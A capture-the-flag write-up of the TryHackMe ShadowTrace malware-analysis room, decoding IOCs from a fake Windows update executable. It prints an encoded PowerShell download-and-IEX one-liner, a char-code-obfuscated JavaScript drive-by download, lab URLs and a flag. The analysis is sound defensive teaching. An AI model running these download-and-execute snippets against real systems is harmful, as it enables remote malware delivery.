# TryHackMe - ShadowTrace

> **Category:** Malware Analysis | Defensive Security
>
> **Difficulty:** Easy
>
> **Objective:** Perform static malware analysis on a suspicious Windows executable, identify Indicators of Compromise (IOCs), analyse suspicious strings and network artifacts, and investigate behavioral alerts generated by the executable.

---

# Scenario

In this challenge, we are provided with a suspicious Windows executable named **windows-update.exe**. Rather than executing the malware, the objective is to perform static analysis to extract useful threat intelligence and answer a series of forensic questions.

The investigation focuses on identifying:

- File architecture
- Cryptographic hashes
- Embedded URLs
- Network Indicators of Compromise (IOCs)
- Encoded data
- Imported libraries
- Suspicious PowerShell activity
- Browser-based download behavior

The executable is located at:

```text
C:\Users\DFIRUser\Desktop\windows-update.exe
```

Several forensic tools are available under:

```text
C:\Users\DFIRUser\DFIR Tools
```

# Embedded URL

PEStudio automatically identified URL patterns embedded within the executable.

Recovered URL:

```text
http://tryhatme.com/update/security-update.exe
```

---

## Analysis

Hardcoded URLs are valuable Indicators of Compromise because they reveal infrastructure used by the malware.

In this case, the URL appears to reference an executable named:

```text
security-update.exe
```

Although the filename resembles a legitimate Windows update, the naming convention is likely intended to deceive users into trusting the downloaded file.

This demonstrates a common social engineering technique where malware disguises itself as a security update.

# Base64 Encoded Data

One recovered string immediately stands out.

```text
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

Unlike ordinary text, this value resembles a Base64 encoded string.

After decoding, the following value is obtained.

```text
THM{you_g0t_some_IOCs_friend}
```

---

## Analysis

Malware frequently stores data using Base64 encoding to make embedded strings less obvious during casual inspection.

Although Base64 provides no encryption, it is commonly used to hide:

- URLs
- PowerShell commands
- Registry paths
- Configuration data
- Payload locations

During malware analysis, encoded strings should always be examined because they often reveal valuable Indicators of Compromise.

# Phase 2 - Behavioral Investigation

The second phase focuses on analysing alerts generated by the executable.

Rather than executing the malware directly, behavioral logs provide insight into suspicious activity triggered by different processes.

---

# PowerShell Alert

One alert involved **powershell.exe** executing the following command.

```powershell
(new-object system.net.webclient).DownloadString(
[Text.Encoding]::UTF8.GetString(
[Convert]::FromBase64String(
"aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"
))) | IEX;
```

---

## Analysis

The PowerShell command follows a common malware execution pattern.

The workflow is:

```text
Base64 String

↓

Decode

↓

DownloadString()

↓

Invoke Expression (IEX)

↓

Execute Retrieved Script
```

Rather than exposing the destination URL directly, the malware first decodes a Base64 string before downloading remote content.

After decoding the embedded value, the recovered URL is:

```text
https://tryhatme.com/dev/main.exe
```

This URL represents the malicious location referenced by the PowerShell alert.

The use of **IEX (Invoke-Expression)** is particularly suspicious because it immediately executes downloaded content in memory, avoiding the need to save a file to disk.

This technique is commonly observed in fileless malware and PowerShell-based attacks.

---

# Browser Alert

Another alert involved **chrome.exe**.

The captured JavaScript was:

```javascript
fetch(
[
104,116,116,112,115,58,47,47,
114,101,97,108,108,121,115,
101,99,117,114,101,117,
112,100,97,116,101,46,
116,114,121,104,97,116,
109,101,46,99,111,109,
47,117,112,100,97,116,
101,46,101,120,101
].map(c=>String.fromCharCode(c)).join(''))
.then(r=>r.blob())
.then(b=>{
const u=URL.createObjectURL(b);
const a=document.createElement('a');
a.href=u;
a.download='test.txt';
document.body.appendChild(a);
a.click();
a.remove();
URL.revokeObjectURL(u);
});
```

---

## Analysis

Instead of storing the URL directly, the JavaScript constructs it dynamically using ASCII character values.

Each integer is converted into its corresponding character before joining the entire sequence into a complete URL.

This simple obfuscation technique makes the malicious destination less obvious during manual inspection.

After decoding the ASCII values, the URL becomes:

```text
https://reallysecureupdate.tryhatme.com/update.exe
```

The script then:

1. Downloads the remote file.
2. Creates a temporary browser object.
3. Generates a download link.
4. Automatically downloads the file.

This behaviour resembles a drive-by download performed through browser scripting.

---

# Downloaded File

Within the JavaScript code, the downloaded filename is explicitly assigned.

```javascript
a.download = 'test.txt';
```

Therefore, the downloaded file is:

```text
test.txt
```

---

## Analysis

Although the downloaded content originates from an executable URL, the browser saves the file using the name:

```text
test.txt
```

Changing filenames in this manner may be used to disguise downloaded content or bypass basic security awareness.

# Conclusion

This challenge demonstrates how static malware analysis can uncover significant threat intelligence without executing a suspicious binary. Through the use of PEStudio and string analysis, important Indicators of Compromise—including cryptographic hashes, embedded URLs, domains, encoded strings, and imported networking libraries—were successfully identified.

The behavioral alerts further revealed how the malware leveraged PowerShell and JavaScript to hide malicious URLs using Base64 encoding and ASCII character arrays. Both techniques are commonly used to obscure network infrastructure and evade casual inspection while enabling remote payload delivery.

Overall, the investigation illustrates the importance of combining metadata analysis, string extraction, import inspection, and behavioral log analysis to understand malware capabilities and recover actionable Indicators of Compromise before execution.
